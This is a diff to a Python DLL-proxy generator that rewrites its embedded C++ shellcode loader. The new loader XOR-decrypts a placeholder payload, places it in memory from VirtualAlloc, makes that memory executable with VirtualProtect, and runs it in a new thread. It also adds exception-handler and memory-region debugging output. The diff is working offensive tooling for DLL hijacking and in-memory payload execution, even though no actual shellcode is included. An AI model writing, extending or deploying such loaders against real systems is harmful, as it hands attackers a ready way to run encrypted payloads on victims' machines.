@@ -15,7 +15,7 @@ Status = "\033[94m[*]\033[0m"
 
 usage = f"""
 
-Usage: \033[0mDllProxyGenerator.py <dll_path> <output_exe_path> [<shellcode_path> <xor_key>] <cpp_script_path>\033[0m
+Usage: \033[0mDllProxyGenerator.py [<dll_path> <output_exe_path>] [<shellcode_path> <xor_key>] <cpp_script_path>\033[0m
 
 /-----------------------------------------------------------------------------------------\\
 ----------------------------{Success}-dll-Proxy-Creation--------------------------------
@@ -84,39 +84,120 @@ def formatCPP(data, key, cipherType):
 shellCodeLoader = """
 #include <windows.h>
 #include <iostream>
+#include <vector>
 
-// Define a function pointer type for the function you want to call
-// For example, a function that returns int and takes no parameters
-typedef int(__stdcall* FuncType)();
+static LPVOID g_alloc = nullptr;
+static SIZE_T g_allocSize = 0;
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd){
+LONG WINAPI VehLog(PEXCEPTION_POINTERS ep) {
+    if (!ep || !ep->ExceptionRecord) return EXCEPTION_CONTINUE_SEARCH;
+    auto& er = *ep->ExceptionRecord;
+    if (er.ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
+        ULONG_PTR rw = er.ExceptionInformation[0];
+        ULONG_PTR addr = er.ExceptionInformation[1];
+        std::cerr << "VEH: ACCESS_VIOLATION " << (rw ? "WRITE" : "READ")
+            << " faultAddr=0x" << std::hex << addr << std::dec << "\\n";
+        if (g_alloc) {
+            uintptr_t base = (uintptr_t)g_alloc;
+            std::cerr << "  allocBase=0x" << std::hex << base << " size=0x" << g_allocSize << std::dec << "\\n";
+            if (addr >= base && addr < base + g_allocSize)
+                std::cerr << "  -> Fault INSIDE allocated region.\\n";
+            else
+                std::cerr << "  -> Fault OUTSIDE allocated region.\\n";
+        }
+        std::cerr << "  ExceptionAddress = 0x" << std::hex
+            << (uintptr_t)er.ExceptionAddress << std::dec << "\\n";
+    }
+    return EXCEPTION_CONTINUE_SEARCH;
+}
+
+int WINAPI WinMain(
+    HINSTANCE hInstance,      // Handle to the current instance of the application.
+    HINSTANCE hPrevInstance,  // Handle to the previous instance (always NULL in modern Windows).
+    LPSTR lpCmdLine,          // Command line arguments as a null-terminated ANSI string (excluding program name).
+    int nCmdShow              // Flag specifying how the window is to be shown (e.g., minimized, maximized).
+) {
+    PVOID vh = AddVectoredExceptionHandler(1, VehLog);
+
+    // Example payload (choose x64/x86 match your build). Replace with any test bytes.
     SHELLCODE_PLACEHOLDER
-    size_t len = sizeof(enc);
+        
+
+    SIZE_T len = sizeof(enc);
+
+    // Allocate RWX (or allocate RW and call VirtualProtect to RX after memcpy)
+    void* exec = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!exec) { std::cerr << "VirtualAlloc failed: " << GetLastError() << "\\n"; return 1; }
+    g_alloc = exec; g_allocSize = len;
+
+    std::cout << "Allocated exec at: " << exec << " len=0x" << std::hex << len << std::dec << "\\n";
+
     KEY
     size_t key_len = sizeof(key) - 1;
 
-    // Allocate executable memory
-    void* exec = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!exec) {
-        return 1;
-    }
-
-    // Decrypt in-place using XOR key
     for (size_t i = 0; i < len; i++)
-        ((unsigned char*)exec)[i] = enc[i] ^ key[i % key_len];
+        enc[i] = enc[i] ^ key[i % key_len];
 
-    // Make the memory executable
-    DWORD oldProtect;
+    // Decode/COPY DIRECTLY INTO exec (no stack VLA)
+    // If you have an encoded buffer, decode byte-by-byte into 'exec'.
+    memcpy(exec, enc, len);
+
+    // Ensure CPU sees new instructions
+    if (!FlushInstructionCache(GetCurrentProcess(), exec, len))
+        std::cerr << "FlushInstructionCache failed: " << GetLastError() << "\\n";
+
+    // Make executable (optional if you allocated RWX)
+    DWORD oldProtect = 0;
     if (!VirtualProtect(exec, len, PAGE_EXECUTE_READ, &oldProtect)) {
-        VirtualFree(exec, 0, MEM_RELEASE);
-        return 1;
+        std::cerr << "VirtualProtect failed: " << GetLastError() << "\\n";
     }
 
-    // Call the decoded stub; it will NOP and immediately return
-    ((void(*)())exec)();
+    // Print memory info for debugging
+    MEMORY_BASIC_INFORMATION mbi;
+    if (VirtualQuery(exec, &mbi, sizeof(mbi))) {
+        std::cerr << "MBI: Base=0x" << std::hex << (uintptr_t)mbi.BaseAddress
+            << " RegionSize=0x" << mbi.RegionSize
+            << " Protect=0x" << mbi.Protect << std::dec << "\\n";
+    }
 
-    VirtualFree(exec, 0, MEM_RELEASE);
+    // Choose how to run: direct call or in a thread (thread is safer under debugger)
+    bool useThread = true;
 
+    std::cout << "Calling payload at " << exec << " useThread=" << useThread << "\\n";
+
+    DWORD tid;
+
+    if (useThread) {
+        HANDLE th = CreateThread(nullptr, 0,
+            reinterpret_cast<LPTHREAD_START_ROUTINE>(exec),
+            nullptr, 0, &tid);
+
+        if (!th) {
+            std::cerr << "CreateThread failed: " << GetLastError() << "\\n";
+        }
+        else {
+            WaitForSingleObject(th, INFINITE);
+            CloseHandle(th);
+        }
+    }
+    else {
+        typedef void(*fn)();
+        fn f = (fn)exec;
+        __try { f(); }
+        __except (EXCEPTION_EXECUTE_HANDLER) {
+            std::cerr << "SEH: exception code 0x" << std::hex << GetExceptionCode() << std::dec << "\\n";
+        }
+    }
+
+    // Only free AFTER payload and any threads have finished
+    if (!VirtualFree(exec, 0, MEM_RELEASE)) {
+        std::cerr << "VirtualFree failed: " << GetLastError() << "\\n";
+    }
+    else {
+        std::cerr << "Memory freed\\n";
+    }
+
+    RemoveVectoredExceptionHandler(vh);
     return 0;
 }
 """
